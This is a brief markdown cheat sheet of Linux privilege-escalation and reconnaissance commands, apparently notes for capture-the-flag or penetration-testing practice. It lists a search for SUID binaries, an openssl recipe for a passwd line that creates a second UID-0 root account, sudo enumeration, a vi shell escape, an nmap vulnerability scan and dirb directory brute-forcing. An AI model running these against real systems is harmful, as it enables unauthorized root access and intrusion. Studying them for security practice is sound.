## Finding SUID Binaries
```
find / -perm -u=s -type f 2>/dev/null
```
## Create Salt Passwd
```
openssl passwd -1 -salt [salt] [password]

salt:new passwd:123

new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

## sudo enum
```
sudo -l
```

## vi escalation
```
:!sh
```

## namp
```
allport scan
nmap -vv -sV -p- --script vuln TARGETIP
```

## dirb
```
dirb TARGETURL WORDLIST 
```




## useful links
GTFOBins  : unix binaries list
- https://gtfobins.github.io/#
